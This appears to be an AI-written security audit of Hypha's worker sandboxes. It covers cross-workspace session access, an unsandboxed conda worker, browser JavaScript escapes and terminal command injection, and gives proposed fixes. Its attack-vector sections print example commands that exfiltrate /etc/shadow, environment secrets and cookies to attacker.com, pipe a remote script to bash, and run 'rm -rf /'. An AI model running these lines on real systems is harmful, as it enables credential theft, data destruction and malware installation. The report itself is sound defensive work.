# Worker Sandbox Security Vulnerability Report

**Date**: 2026-02-08
**Analyst**: Worker Sandbox Security Expert
**Target**: Hypha Workers (`hypha/workers/`)
**Severity**: HIGH to CRITICAL

## Executive Summary

Analysis of Hypha's worker implementations revealed **4 HIGH to CRITICAL severity vulnerabilities** in sandbox isolation and code execution security. The most critical finding is that workers do not validate workspace ownership of sessions, allowing cross-workspace code execution attacks (similar to vulnerabilities V10-V14 in the main codebase).

## Critical Vulnerabilities

### W1: Cross-Workspace Session Access in Workers (HIGH SEVERITY)

**Affected Files:**
- `hypha/workers/browser.py:1259-1299` - BrowserWorker.execute()
- `hypha/workers/conda.py:1029-1168` - CondaWorker.execute()
- `hypha/workers/terminal.py:959-1197` - TerminalWorker.execute()
- Similar issues in stop() and get_logs() methods

**Vulnerability Pattern:**
Workers validate permission on `context["ws"]` but don't verify that `session_id` belongs to that workspace. Session IDs have format `{workspace}/{client_id}`, allowing an attacker to reference sessions in other workspaces.

**Attack Scenario:**
```python
# Attacker in workspace-A connects
api_attacker = await connect_to_server({
    "workspace": "workspace-A",
    "token": attacker_token
})

# Get worker service
worker = await api_attacker.get_service("public/browser-worker")

# Execute code in victim's session in workspace-B
await worker.execute(
    session_id="workspace-B/victim-session-123",
    script="console.log(document.cookie); /* steal secrets */"
)
```

**Impact:**
- Cross-workspace code execution
- Session hijacking
- Data theft from other workspaces
- Violation of workspace isolation guarantees

**Root Cause:**
```python
# In BrowserWorker.execute() - VULNERABLE CODE
async def execute(self, session_id: str, context: dict = None):
    # Only checks if session exists, not if user has permission
    if session_id not in self._sessions:
        raise SessionNotFoundError(f"Browser session {session_id} not found")

    # NO validation that session_id workspace matches context["ws"]
    # Proceeds to execute in any session the attacker knows about
```

**Fix Required:**
```python
async def execute(self, session_id: str, context: dict = None):
    # Extract workspace from session_id
    if "/" in session_id:
        session_ws = session_id.split("/")[0]
        context_ws = context.get("ws")

        # If session is in different workspace, validate permission
        if session_ws != context_ws:
            user_info = UserInfo.from_context(context)
            if not user_info.check_permission(session_ws, UserPermission.read):
                raise PermissionError(
                    f"Permission denied: no access to workspace {session_ws}"
                )

    # Now proceed with execution
    if session_id not in self._sessions:
        raise SessionNotFoundError(f"Session {session_id} not found")
    # ... rest of method
```

**Related Vulnerabilities:**
This follows the same pattern as V10-V14 (documented in `tests/test_security_vulnerabilities.py`):
- V10: Session stop cross-workspace access
- V11: get_logs cross-workspace information disclosure
- V12: get_session_info cross-workspace information disclosure
- V14: edit_worker cross-workspace manipulation

**Key Lesson from CLAUDE.md:**
> When an ID contains a workspace prefix (e.g., `workspace/client_id`), always validate permission on the embedded workspace, not just `context["ws"]`.

---

### W3: Conda Worker Python Sandbox (CRITICAL SEVERITY)

**Affected File:** `hypha/workers/conda.py`

**Vulnerability:**
The conda worker executes arbitrary Python code via Jupyter kernel with **NO sandboxing**. Code runs with full system privileges and access.

**Attack Vectors:**

1. **File System Access:**
```python
# Read any file on the system
with open('/etc/passwd', 'r') as f:
    secrets = f.read()

# Read SSH keys
import os
ssh_keys = os.listdir('/root/.ssh/')
```

2. **System Command Execution:**
```python
import os
os.system('curl attacker.com/exfil?data=$(cat /etc/shadow)')

import subprocess
subprocess.run(['rm', '-rf', '/'], check=True)
```

3. **Environment Variable Access:**
```python
import os
aws_key = os.environ.get('AWS_SECRET_ACCESS_KEY')
database_url = os.environ.get('DATABASE_URL')
# Send to attacker
```

4. **Network Exfiltration:**
```python
import requests
requests.post('https://attacker.com/collect', json={
    'workspace_data': read_all_files(),
    'env_vars': dict(os.environ),
    'system_info': platform.uname()
})
```

**Impact:**
- **CRITICAL**: Full system compromise
- Access to all workspaces' data
- Credential theft
- Lateral movement to other systems
- Data exfiltration

**Status:**
This appears to be **by design** for ML/scientific computing workloads where users need full Python access. However, this creates extreme security risks in multi-tenant environments.

**Recommendations:**

1. **Immediate Actions:**
   - Add prominent security warnings to conda worker documentation
   - Require explicit user acknowledgment of security risks
   - Document that conda worker is NOT sandboxed
   - Recommend using for trusted code only

2. **Long-term Solutions:**
   - Implement optional sandboxing using RestrictedPython or similar
   - Add filesystem restrictions via chroot/containers
   - Network isolation per workspace
   - Resource quotas and monitoring
   - Consider moving to containerized execution (Docker/Kubernetes)

3. **Detection & Monitoring:**
   - Log all code executions with workspace context
   - Alert on suspicious imports (os, subprocess, socket)
   - Monitor outbound network connections
   - Track file access patterns

---

### W2: Browser Worker JavaScript Sandbox (HIGH SEVERITY)

**Affected File:** `hypha/workers/browser.py:1259-1299`

**Vulnerability:**
JavaScript execution via Playwright's `page.evaluate()` may allow sandbox escapes depending on browser configuration.

**Potential Attack Vectors:**

1. **Node.js Access (if misconfigured):**
```javascript
// If Node integration is enabled
const fs = require('fs');
const secrets = fs.readFileSync('/etc/passwd', 'utf8');
```

2. **File URL Access:**
```javascript
// Navigate to local files
window.location = 'file:///etc/passwd';
```

3. **Network Exfiltration:**
```javascript
// Fetch API is available in browser context
fetch('https://attacker.com/exfil', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        localStorage: localStorage,
        sessionStorage: sessionStorage
    })
});
```

4. **WebSocket to Attacker:**
```javascript
const ws = new WebSocket('wss://attacker.com/collect');
ws.onopen = () => ws.send(document.documentElement.innerHTML);
```

**Status:** Requires manual testing with actual browser worker deployment.

**Recommendations:**
- Review Playwright browser context configuration
- Ensure `--disable-blink-features=AutomationControlled` is set
- Disable file:// protocol access
- Implement Content Security Policy (CSP)
- Review and restrict browser permissions
- Consider running in isolated container

---

### W4: Terminal Worker Command Injection (HIGH SEVERITY)

**Affected File:** `hypha/workers/terminal.py:959-1197`

**Vulnerability:**
Executes shell commands via pexpect with minimal input sanitization, allowing shell metacharacter injection.

**Attack Vectors:**

1. **Command Chaining:**
```python
script = "ls; rm -rf /important_data"
await terminal_worker.execute(session_id, script)
```

2. **Command Substitution:**
```python
script = "echo $(cat /etc/passwd)"
await terminal_worker.execute(session_id, script)
```

3. **Background Execution:**
```python
script = "curl attacker.com/malware.sh | bash &"
await terminal_worker.execute(session_id, script)
```

4. **Environment Manipulation:**
```python
script = "export MALICIOUS=$SECRET; curl attacker.com?data=$MALICIOUS"
await terminal_worker.execute(session_id, script)
```

**Current Code:**
```python
# From terminal.py:1020-1024
terminal_process.write(script.encode())
if not script.endswith('\n'):
    terminal_process.write(b'\n')
```

The script is written directly to the terminal with no sanitization.

**Impact:**
- Arbitrary command execution
- File system access
- Network access
- Process spawning
- Privilege escalation (if terminal runs as privileged user)

**Recommendations:**
- Implement command whitelisting
- Sanitize shell metacharacters
- Use parameterized command execution
- Run terminal in restricted container
- Implement resource limits

---

## Architecture Security Issues

### Worker Base Class

**File:** `hypha/workers/base.py:174-329`

**Issues:**

1. **`require_context` defaults to False:**
```python
@property
def require_context(self) -> bool:
    """Return whether the worker requires a context."""
    return False  # Should be True for security
```

2. **No built-in session validation:**
The base class doesn't provide workspace validation utilities. Each worker must implement its own checks.

3. **Visibility defaults are good:**
```python
@property
def visibility(self) -> str:
    """Return the worker visibility."""
    return "protected"  # Good default
```

### Session Management

**Predictable Session IDs:**
- Format: `{workspace}/{client_id}`
- No cryptographic randomness
- Enumerable if client IDs are predictable

**Recommendation:**
```python
# Generate session IDs with UUID
import uuid
session_id = f"{workspace}/{uuid.uuid4()}"
```

---

## Test Coverage

**Created File:** `/Users/wei.ouyang/workspace/hypha/tests/test_worker_sandbox_vulnerabilities.py`

**Test Classes:**
1. `TestW1CrossWorkspaceSessionAccess` - Cross-workspace execution tests
2. `TestW2BrowserWorkerSandboxEscape` - JavaScript escape tests (manual)
3. `TestW3CondaWorkerPythonSandbox` - Python execution tests (manual)
4. `TestW4TerminalWorkerCommandInjection` - Command injection tests (manual)
5. `TestW5WorkerSessionHijacking` - Session ID security tests
6. `TestW6KubernetesWorkerPodEscape` - K8s pod escape tests (manual)
7. `TestW7CondaWorkerSharedMemory` - Shared memory isolation tests (manual)
8. `TestW8BrowserWorkerFileSystemAccess` - File access tests (manual)
9. `TestWorkerVisibilityAndAuthorization` - Visibility enforcement tests

**Note:** Most tests require complex environment setup (conda, Playwright, Kubernetes) and are marked for manual testing.

---

## Remediation Priority

### Critical (Fix Immediately)
1. **W1: Cross-Workspace Session Access** - Actively exploitable, breaks workspace isolation
2. **W3: Conda Worker Documentation** - Users must understand security risks

### High (Fix Soon)
3. **W2: Browser Worker Audit** - Review Playwright configuration
4. **W4: Terminal Worker Sanitization** - Add input validation
5. **Session ID Security** - Add cryptographic randomness

### Medium (Ongoing)
6. **Worker Base Class** - Make `require_context=True` default
7. **Monitoring & Logging** - Track suspicious activity
8. **Documentation** - Security best practices for worker usage

---

## Manual Testing Required

The following vulnerabilities require hands-on testing with deployed workers:

1. **Conda Worker:**
   - Deploy conda worker with test environment
   - Test file system access boundaries
   - Test network access capabilities
   - Test process spawning
   - Test shared memory isolation

2. **Browser Worker:**
   - Deploy browser worker with Playwright
   - Test Node.js require() access
   - Test file:// URL navigation
   - Test WebSocket connections
   - Test DOM-based escapes

3. **Terminal Worker:**
   - Deploy terminal worker
   - Test shell metacharacter injection
   - Test command substitution
   - Test environment variable manipulation
   - Test background process spawning

4. **Kubernetes Worker:**
   - Deploy on K8s cluster
   - Test pod privilege escalation
   - Test host path mounting
   - Test K8s API access from pods
   - Test container breakout techniques

See `TestWorkerSandboxManualTests` in test file for detailed procedures.

---

## Comparison with Existing Vulnerabilities

The W1 vulnerability follows the **exact same pattern** as V10-V14:

| ID | Component | Pattern |
|----|-----------|---------|
| V10 | ServerAppController.stop | Validates context["ws"], operates on session workspace |
| V11 | ServerAppController.get_logs | Same pattern |
| V12 | ServerAppController.get_session_info | Same pattern |
| V14 | ServerAppController.edit_worker | Same pattern |
| **W1** | **Worker.execute/stop/get_logs** | **Same pattern in workers** |

This suggests a **systemic issue** with how Hypha handles IDs containing workspace prefixes.

**Root Cause:** When IDs embed workspace information (`workspace/identifier`), the code validates permission on `context["ws"]` but operates on the workspace extracted from the ID.

**Systemic Fix:** Create a utility function:
```python
def validate_workspace_id_permission(id_with_workspace: str, context: dict, permission: UserPermission):
    """Validate user has permission on workspace embedded in ID."""
    if "/" in id_with_workspace:
        target_ws = id_with_workspace.split("/")[0]
        context_ws = context.get("ws")
        if target_ws != context_ws:
            user_info = UserInfo.from_context(context)
            if not user_info.check_permission(target_ws, permission):
                raise PermissionError(f"No permission on workspace {target_ws}")
```

---

## References

- Security vulnerabilities V10-V14: `tests/test_security_vulnerabilities.py:1114-1442`
- CLAUDE.md security patterns: Lines V10-V14 documentation
- Worker implementations: `hypha/workers/`
- Worker base class: `hypha/workers/base.py`

---

## Next Steps

1. Implement W1 fix across all workers (browser, conda, terminal)
2. Add conda worker security warnings to documentation
3. Audit browser worker Playwright configuration
4. Design terminal worker input sanitization
5. Create systemic utility for workspace ID validation
6. Run manual tests with deployed workers
7. Update CLAUDE.md with worker security patterns
